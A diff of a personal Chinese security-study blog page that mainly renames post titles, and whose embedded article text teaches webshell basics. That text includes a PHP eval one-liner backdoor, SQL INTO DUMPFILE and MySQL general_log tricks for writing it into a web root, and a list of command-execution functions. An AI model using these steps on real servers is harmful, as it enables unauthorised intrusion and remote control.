@@ -6,25 +6,25 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="han个人博客">
-    <title>note31 - han个人博客</title>
+    <title>笔记31 - han个人博客</title>
     <meta name="author" content="han">
     
     
     
         <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: webshall 的原理，中国菜刀、AntSword 和 Behinder 的使用。\n\n\n\n\n\n\n学习目的\n熟悉 PHP 命令执行的函数\n理解什么是 webshell\n能够写出一句话木马\n能够利用大马\n熟练中国菜刀的使用\n理解 webshell 的变形\n\nWebshellPhpmyadmin\n​    getshell 一般情况下，两种操作方式\nSQL 语句 into outfile\n1SELECT &quot;123&quot; INTO DUMPFILE &quot;绝对路径&quot;; # 直接写文件\n\n1SELECT &quot;&lt;?php @eval($_POST[&apos;pass&apos;])?&gt;&quot; INTO DUMPFILE &quot;C:/phpStudy/PHPTutorial/www/a.php&quot;;\n\n--secure-file-priv option\n源代码拷贝到网站根目录中，之后修改权限\n1chown -R apache: apache /var/www/html\n\n一定要弄清楚权限\nphp 代码    apache用户\n数据库操作 SQL 语句       mysql 用户\nmysql 日志写 webshell\nmysql 每执行一个 sql 语句，就会把 sql 语句写入到文件日志中，但默认情况下，这个选项是关闭的，因此需要去开启这个选项，再设置日志路径，日志路径设置为网站目录，日志文件名字为 .php 结尾的文件\ngeneral log   OFF -&gt; ON   打开日志功能\n123SHOW MASTER LOGS;SET GLOBAL general_log = &apos;ON&apos;SET GLOBAL general_log_file = &apos;C:/phpStudy/PHPTutorial/WWW/404.php&apos;\n\n执行任意 sql 语句，就能把内容存到 .php 结尾的文件中\n1SELECT &quot;&lt;?php @eval($_POST[&quot;pass&quot;])?&gt;&quot;\n\n除了 &lt;?php ?&gt; 其他均解析为 html\nphp 的短标签：\n\n\n\n&lt;% %&gt;\n\n\n\n \n\n\n\nPHP基础执行 PHP 代码：​    eval(), assert()\n执行系统命令：* system() 输出并返回最后一行 shell 结果\n* exec() 不输出结果，返回最后一行 shell 结果，所有结果可以保存一个返回的数组里面\n* passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上\n* popen()\n* shell_exec()\n* proc_open()\n* pcntl_exec()反引号 ` 这个实际上使用的是 shell_exec\nexec()函数exec函数，执行外部程序，不直接显示输出，只显示最后一行结果，一般把结果输出到数组中保存。\n1234&lt;?php\techo exec(\"ipconfig\", $output);l    echo $output[1];?&gt;\n\n反引号执行外部程序，不直接显示输出，与 shell_exec() 函数等同\n12345&lt;?php    \techo `ipconfig`;    ?&gt;\n\n更多函数\nShellshell 是系统的用户界面，提供了用户与内核进行交互操作的一种接口。\n什么是 webshell黑客在入侵了一个网站后，通常会留下一个 asp、aspx、jsp、php 等脚本后门文件与网站 web 服务器进行交互，得到了一个命令执行环境，以达到控制网站服务器的目的，这个后门文件就是所谓的 webshell。\n一句话木马介绍一句话木马是 webshell 的一种，由与这类 webshell 代码比较少，往往只有一行代码，所以就被称为一句话木马。\n一句话木马虽然代码简单，但结合中国菜刀等 webshell 管理工具，它们的功能确实非常强大的。\n","dateCreated":"2019-08-27T19:15:53+08:00","dateModified":"2019-08-27T23:28:29+08:00","datePublished":"2019-08-27T19:15:53+08:00","description":"Abstract: webshall 的原理，中国菜刀、AntSword 和 Behinder 的使用。","headline":"note31","image":["https://images.unsplash.com/photo-1534801189582-810af28d898b?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=700&q=80"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/08/27/note31/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/08/27/note31/","keywords":"webshell","thumbnailUrl":"https://images.unsplash.com/photo-1534801189582-810af28d898b?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=700&q=80"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: webshall 的原理，中国菜刀、AntSword 和 Behinder 的使用。\n\n\n\n\n\n\n学习目的\n熟悉 PHP 命令执行的函数\n理解什么是 webshell\n能够写出一句话木马\n能够利用大马\n熟练中国菜刀的使用\n理解 webshell 的变形\n\nWebshellPhpmyadmin\n​    getshell 一般情况下，两种操作方式\nSQL 语句 into outfile\n1SELECT &quot;123&quot; INTO DUMPFILE &quot;绝对路径&quot;; # 直接写文件\n\n1SELECT &quot;&lt;?php @eval($_POST[&apos;pass&apos;])?&gt;&quot; INTO DUMPFILE &quot;C:/phpStudy/PHPTutorial/www/a.php&quot;;\n\n--secure-file-priv option\n源代码拷贝到网站根目录中，之后修改权限\n1chown -R apache: apache /var/www/html\n\n一定要弄清楚权限\nphp 代码    apache用户\n数据库操作 SQL 语句       mysql 用户\nmysql 日志写 webshell\nmysql 每执行一个 sql 语句，就会把 sql 语句写入到文件日志中，但默认情况下，这个选项是关闭的，因此需要去开启这个选项，再设置日志路径，日志路径设置为网站目录，日志文件名字为 .php 结尾的文件\ngeneral log   OFF -&gt; ON   打开日志功能\n123SHOW MASTER LOGS;SET GLOBAL general_log = &apos;ON&apos;SET GLOBAL general_log_file = &apos;C:/phpStudy/PHPTutorial/WWW/404.php&apos;\n\n执行任意 sql 语句，就能把内容存到 .php 结尾的文件中\n1SELECT &quot;&lt;?php @eval($_POST[&quot;pass&quot;])?&gt;&quot;\n\n除了 &lt;?php ?&gt; 其他均解析为 html\nphp 的短标签：\n\n\n\n&lt;% %&gt;\n\n\n\n \n\n\n\nPHP基础执行 PHP 代码：​    eval(), assert()\n执行系统命令：* system() 输出并返回最后一行 shell 结果\n* exec() 不输出结果，返回最后一行 shell 结果，所有结果可以保存一个返回的数组里面\n* passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上\n* popen()\n* shell_exec()\n* proc_open()\n* pcntl_exec()反引号 ` 这个实际上使用的是 shell_exec\nexec()函数exec函数，执行外部程序，不直接显示输出，只显示最后一行结果，一般把结果输出到数组中保存。\n1234&lt;?php\techo exec(\"ipconfig\", $output);l    echo $output[1];?&gt;\n\n反引号执行外部程序，不直接显示输出，与 shell_exec() 函数等同\n12345&lt;?php    \techo `ipconfig`;    ?&gt;\n\n更多函数\nShellshell 是系统的用户界面，提供了用户与内核进行交互操作的一种接口。\n什么是 webshell黑客在入侵了一个网站后，通常会留下一个 asp、aspx、jsp、php 等脚本后门文件与网站 web 服务器进行交互，得到了一个命令执行环境，以达到控制网站服务器的目的，这个后门文件就是所谓的 webshell。\n一句话木马介绍一句话木马是 webshell 的一种，由与这类 webshell 代码比较少，往往只有一行代码，所以就被称为一句话木马。\n一句话木马虽然代码简单，但结合中国菜刀等 webshell 管理工具，它们的功能确实非常强大的。\n","dateCreated":"2019-08-27T19:15:53+08:00","dateModified":"2019-09-09T13:38:16+08:00","datePublished":"2019-08-27T19:15:53+08:00","description":"Abstract: webshall 的原理，中国菜刀、AntSword 和 Behinder 的使用。","headline":"笔记31","image":["https://images.unsplash.com/photo-1534801189582-810af28d898b?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=700&q=80"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/08/27/note31/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/08/27/note31/","keywords":"webshell","thumbnailUrl":"https://images.unsplash.com/photo-1534801189582-810af28d898b?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=700&q=80"}</script>
     <meta name="description" content="Abstract: webshall 的原理，中国菜刀、AntSword 和 Behinder 的使用。">
 <meta name="keywords" content="webshell">
 <meta property="og:type" content="blog">
-<meta property="og:title" content="note31">
+<meta property="og:title" content="笔记31">
 <meta property="og:url" content="http://yoursite.com/2019/08/27/note31/index.html">
 <meta property="og:site_name" content="han个人博客">
 <meta property="og:description" content="Abstract: webshall 的原理，中国菜刀、AntSword 和 Behinder 的使用。">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-08-27T15:28:29.671Z">
+<meta property="og:updated_time" content="2019-09-09T05:38:16.116Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="note31">
+<meta name="twitter:title" content="笔记31">
 <meta name="twitter:description" content="Abstract: webshall 的原理，中国菜刀、AntSword 和 Behinder 的使用。">
     
     
@@ -261,7 +261,7 @@
         <div class="post-header main-content-wrap text-center">
     
         <h1 class="post-title">
-            note31
+            笔记31
         </h1>
     
     
@@ -380,8 +380,8 @@
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
                     href="/2019/08/27/note32/"
-                    data-tooltip="note32"
-                    aria-label="PREVIOUS: note32"
+                    data-tooltip="笔记32"
+                    aria-label="PREVIOUS: 笔记32"
                 >
                     
                         <i class="fa fa-angle-left" aria-hidden="true"></i>
@@ -394,8 +394,8 @@
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
                     href="/2019/08/24/note30/"
-                    data-tooltip="note30"
-                    aria-label="NEXT: note30"
+                    data-tooltip="笔记30"
+                    aria-label="NEXT: 笔记30"
                 >
                     
                         <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
@@ -495,8 +495,8 @@
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
                     href="/2019/08/27/note32/"
-                    data-tooltip="note32"
-                    aria-label="PREVIOUS: note32"
+                    data-tooltip="笔记32"
+                    aria-label="PREVIOUS: 笔记32"
                 >
                     
                         <i class="fa fa-angle-left" aria-hidden="true"></i>
@@ -509,8 +509,8 @@
                 <a
                     class="post-action-btn btn btn--default tooltip--top"
                     href="/2019/08/24/note30/"
-                    data-tooltip="note30"
-                    aria-label="NEXT: note30"
+                    data-tooltip="笔记30"
+                    aria-label="NEXT: 笔记30"
                 >
                     
                         <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
@@ -698,7 +698,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/28/dvwa-deploy/"
-                            aria-label=": dvwa-deploy"
+                            aria-label=": dvwa 在 CentOS 部署"
                         >
                             <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/image-gallery-showcase/city-140.jpg" width="90" height="90"/>
                         </a>
@@ -708,9 +708,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/28/dvwa-deploy/"
-                            aria-label=": dvwa-deploy"
+                            aria-label=": dvwa 在 CentOS 部署"
                         >
-                            <h3 class="media-heading">dvwa-deploy</h3>
+                            <h3 class="media-heading">dvwa 在 CentOS 部署</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -763,8 +763,8 @@
                     <div class="media-left">
                         <a
                             class="link-unstyled"
-                            href="http://yoursite.com/2019/07/29/noteday11/"
-                            aria-label=": note11"
+                            href="http://yoursite.com/2019/07/29/note11/"
+                            aria-label=": 笔记11"
                         >
                             <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/elements-showcase/vintage-140.jpg" width="90" height="90"/>
                         </a>
@@ -773,10 +773,10 @@
                     <div class="media-body">
                         <a
                             class="link-unstyled"
-                            href="http://yoursite.com/2019/07/29/noteday11/"
-                            aria-label=": note11"
+                            href="http://yoursite.com/2019/07/29/note11/"
+                            aria-label=": 笔记11"
                         >
-                            <h3 class="media-heading">note11</h3>
+                            <h3 class="media-heading">笔记11</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -798,7 +798,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/29/week2sum/"
-                            aria-label=": week2sum"
+                            aria-label=": 第二周总结"
                         >
                             <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
                         </a>
@@ -808,9 +808,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/29/week2sum/"
-                            aria-label=": week2sum"
+                            aria-label=": 第二周总结"
                         >
-                            <h3 class="media-heading">week2sum</h3>
+                            <h3 class="media-heading">第二周总结</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -819,7 +819,7 @@
                                 
                             </span>
                         </span>
-                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 对第二周学习的内容进行总结</p></div>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 对第二周学习的内容进行总结，<code>note6-note10</code>的笔记。</p></div>
                     </div>
                     <div style="clear:both;"></div>
                     <hr>
@@ -897,7 +897,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/30/note12/"
-                            aria-label=": note12"
+                            aria-label=": 笔记12"
                         >
                             <img class="media-image" src="https://images.unsplash.com/photo-1561363702-e07252da3399?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1050&amp;q=80" width="90" height="90"/>
                         </a>
@@ -907,9 +907,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/07/30/note12/"
-                            aria-label=": note12"
+                            aria-label=": 笔记12"
                         >
-                            <h3 class="media-heading">note12</h3>
+                            <h3 class="media-heading">笔记12</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -930,7 +930,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/01/note13/"
-                            aria-label=": note13"
+                            aria-label=": 笔记13"
                         >
                             <img class="media-image" src="https://images.unsplash.com/photo-1563930365798-3014c158554f?ixlib=rb-1.2.1&amp;auto=format&amp;fit=crop&amp;w=500&amp;q=60" width="90" height="90"/>
                         </a>
@@ -940,9 +940,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/01/note13/"
-                            aria-label=": note13"
+                            aria-label=": 笔记13"
                         >
-                            <h3 class="media-heading">note13</h3>
+                            <h3 class="media-heading">笔记13</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -963,7 +963,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/01/note14/"
-                            aria-label=": note14"
+                            aria-label=": 笔记14"
                         >
                             <img class="media-image" src="https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=1&amp;w=500" width="90" height="90"/>
                         </a>
@@ -973,9 +973,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/01/note14/"
-                            aria-label=": note14"
+                            aria-label=": 笔记14"
                         >
-                            <h3 class="media-heading">note14</h3>
+                            <h3 class="media-heading">笔记14</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
@@ -996,7 +996,7 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/03/note15/"
-                            aria-label=": note15"
+                            aria-label=": 笔记15"
                         >
                             <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
                         </a>
@@ -1006,9 +1006,9 @@
                         <a
                             class="link-unstyled"
                             href="http://yoursite.com/2019/08/03/note15/"
-                            aria-label=": note15"
+                            aria-label=": 笔记15"
                         >
-                            <h3 class="media-heading">note15</h3>
+                            <h3 class="media-heading">笔记15</h3>
                         </a>
                         <span class="media-meta">
                             <span class="media-date text-small">
